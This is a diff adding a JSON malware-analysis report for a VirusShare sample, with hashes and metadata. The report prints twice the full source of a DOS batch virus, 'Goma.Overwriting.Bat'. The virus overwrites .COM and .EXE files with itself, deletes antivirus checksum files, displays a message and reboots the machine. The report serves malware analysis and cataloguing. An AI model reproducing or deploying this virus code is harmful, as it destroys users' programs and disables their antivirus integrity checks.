@@ -1,0 +1,68 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": "REM ****************** Goma.Overwriting.Bat.Compiled ************************\nREM        Nome do virus: Goma.Overwriting.Bat\nREM        Autor : nim_bus@hotmail.com\nREM        Tipo : Runtime Overwriting , COM e EXE infector .\nREM        Tamanho : 4301 bytes\nREM        Av's : none\nREM        Retro : apagar arquivos de verificacao\nREM        Ativacao : mensagem, diretorio, beep e fechar a tarefa !\nREM        Bug's : favor entrar em contato caso voce detecte algum ...\nREM        Compilar/linkar com TurboBat 3.?? ou uuencoda ele !\nREM *************************************************************************\n:inicio\n\n:procura\nfor %%f in (..\\*.com *.com ..\\*.exe *.exe) do set var=%%f\n\n:ja_infec\nfind /i \"[TDG'2000]\" <%var% >nul\nif not errorlevel 1 GOTO fim\n\n:infectar\necho s | copy %0 %var% > nul\n\n:apagar\nDELTREE /Y SMARTCHK.CPS > nul\nDELTREE /Y ANTI-VIR.DAT > nul\nDELTREE /Y AVP.CRC      > nul\nDELTREE /Y IVB.NTZ      > nul\nDELTREE /Y CHKLIST.MS   > nul\n\n\n:zoa\nECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]\nECHO.\nECHO.                  Um novo conceito em v\ufffdrus de computador\nECHO.\nECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]\nMD \ufffd\ufffdGoma\ufffd\ufffd >nul\nBEEP 440 40\n\n:fim\nset var=\nBOOT WARM\nREM ****************** Goma.Overwriting.Bat.Compiled ************************"
+    },
+    "filename": "VirusShare_16c6fb6f49fba0239fa66c7ccea6957f",
+    "filesize": 1374,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "16c6fb6f49fba0239fa66c7ccea6957f",
+        "sha1": "53eb02ca807da3bcb4bb787bf5e8b00aa3642357",
+        "sha256": "0d0a23b6e5757e703e18f9024d82dca1cd980edb86fa7129431ef5367e84abfe"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "REM ****************** Goma.Overwriting.Bat.Compiled ************************",
+            "REM        Nome do virus: Goma.Overwriting.Bat",
+            "REM        Autor : nim_bus@hotmail.com",
+            "REM        Tipo : Runtime Overwriting , COM e EXE infector .",
+            "REM        Tamanho : 4301 bytes",
+            "REM        Av's : none",
+            "REM        Retro : apagar arquivos de verificacao",
+            "REM        Ativacao : mensagem, diretorio, beep e fechar a tarefa !",
+            "REM        Bug's : favor entrar em contato caso voce detecte algum ...",
+            "REM        Compilar/linkar com TurboBat 3.?? ou uuencoda ele !",
+            "REM *************************************************************************",
+            ":inicio",
+            ":procura",
+            "for %%f in (..\\*.com *.com ..\\*.exe *.exe) do set var=%%f",
+            ":ja_infec",
+            "find /i \"[TDG'2000]\" <%var% >nul",
+            "if not errorlevel 1 GOTO fim",
+            ":infectar",
+            "echo s | copy %0 %var% > nul",
+            ":apagar",
+            "DELTREE /Y SMARTCHK.CPS > nul",
+            "DELTREE /Y ANTI-VIR.DAT > nul",
+            "DELTREE /Y AVP.CRC      > nul",
+            "DELTREE /Y IVB.NTZ      > nul",
+            "DELTREE /Y CHKLIST.MS   > nul",
+            ":zoa",
+            "ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]",
+            "ECHO.",
+            "ECHO.                  Um novo conceito em vrus de computador",
+            "ECHO.",
+            "ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]",
+            "MD Goma >nul",
+            "BEEP 440 40",
+            ":fim",
+            "set var=",
+            "BOOT WARM",
+            "REM ****************** Goma.Overwriting.Bat.Compiled ************************"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.474082",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
